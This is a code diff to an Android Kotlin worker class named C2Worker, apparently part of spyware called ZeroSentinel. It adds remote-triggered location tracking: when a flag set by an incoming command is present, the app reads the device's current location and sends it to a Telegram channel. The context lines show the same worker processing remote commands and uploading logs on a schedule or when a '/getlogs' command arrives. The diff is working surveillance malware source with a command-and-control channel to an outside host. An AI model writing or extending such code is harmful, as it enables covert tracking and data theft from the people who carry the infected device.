@@ -37,7 +37,18 @@ class C2Worker(appContext: Context, workerParams: WorkerParameters) :
                     // 1. Command Processing (Priority)
                     processCommands()
 
-                    // 2. Upload Logs & Cleanup - Only at 3 AM or when triggered by /getlogs
+                    // 2. Location Tracking (On-Demand)
+                    val prefs = (applicationContext.applicationContext as ZeroSentinelApp).prefsManager
+                    if (prefs.isPendingLocationRequest()) {
+                        Log.d("C2Worker", "Pending location request found. Fetching...")
+                        prefs.savePendingLocationRequest(false) // Reset flag immediately
+                        
+                        val location = com.zero.sentinel.utils.LocationHelper.getCurrentLocation(applicationContext)
+                        val message = com.zero.sentinel.utils.LocationHelper.formatLocationMessage(location)
+                        telegramClient.sendMessage(message)
+                    }
+
+                    // 3. Upload Logs & Cleanup - Only at 3 AM or when triggered by /getlogs
                     val currentHour =
                             java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
                     if (currentHour == 3) {
